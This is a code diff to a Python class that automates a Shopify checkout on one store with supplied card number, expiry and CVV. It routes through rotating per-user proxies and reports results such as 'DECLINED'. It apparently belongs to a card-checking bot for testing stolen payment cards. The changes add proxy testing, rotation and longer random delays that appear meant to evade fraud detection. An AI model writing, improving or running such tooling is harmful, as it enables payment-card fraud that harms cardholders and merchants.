@@ -2067,7 +2263,7 @@ class ShopifyKauffmanCheckout:
                     self.logger.step(12, "POLL RECEIPT RETRY", f"Error on attempt {poll_attempts}, retrying...", str(e)[:50], "WAIT")
                     await asyncio.sleep(base_delay)
                     continue
-                return False, f"Poll error: {str(e)[:50]}"
+                return False, f"POLL_ERROR"
         
         return False, "DECLINED - TIMEOUT"
 
@@ -2083,67 +2279,88 @@ class ShopifyKauffmanCheckout:
                     self.logger.error_log("NO_PROXY", "No working proxies available")
                     return False, "NO_PROXY_AVAILABLE"
                 
-                self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=20, follow_redirects=True)
+                # Test proxy before using
+                proxy_works, response_time = await self.test_proxy_connection(self.proxy_url)
+                if not proxy_works:
+                    self.logger.error_log("PROXY", "Proxy test failed, trying another")
+                    # Try one more time with a different proxy
+                    self.proxy_url = get_proxy_for_user(self.user_id, "random")
+                    if not self.proxy_url:
+                        return False, "NO_PROXY_AVAILABLE"
+                
+                self.client = httpx.AsyncClient(
+                    proxy=self.proxy_url, 
+                    timeout=30, 
+                    follow_redirects=True,
+                    verify=certifi.where(),
+                    http2=True,
+                    limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
+                )
                 self.proxy_status = "Live ⚡️"
                 self.proxy_used = True
                 self.logger.data_extracted("Proxy", f"{self.proxy_url[:30]}...", "Proxy System")
             else:
                 self.proxy_status = "No Proxy"
-                self.client = httpx.AsyncClient(timeout=20, follow_redirects=True)
+                self.client = httpx.AsyncClient(
+                    timeout=30, 
+                    follow_redirects=True,
+                    verify=certifi.where(),
+                    http2=True
+                )
             
             # Step 1: Get product page
             success, result = await self.get_product_page()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 2: Add 2 units to cart
             success, result = await self.add_to_cart()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 3: Get checkout token
             success, result = await self.get_checkout_token()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 4: Get session token
             success, result = await self.get_session_token()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 5: Submit proposal
             success, result = await self.submit_proposal()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 6: Update contact with email
             success, result = await self.update_contact_info()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 7: Select pickup delivery
             success, result = await self.select_pickup_delivery()
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 8: Create payment session
             success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
             if not success:
                 return False, payment_session_id
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 9: Update billing address
             success, result = await self.update_billing_address(payment_session_id)
             if not success:
                 return False, result
-            await self.random_delay(0.3, 0.5)
+            await self.random_delay(0.5, 1.0)
             
             # Step 10: Submit for completion
             success, result = await self.submit_for_completion(payment_session_id)
@@ -2152,7 +2369,7 @@ class ShopifyKauffmanCheckout:
             
         except Exception as e:
             self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
-            return False, f"Checkout error: {str(e)[:50]}"
+            return False, f"CHECKOUT_ERROR"
         finally:
             if self.client:
                 await self.client.aclose()
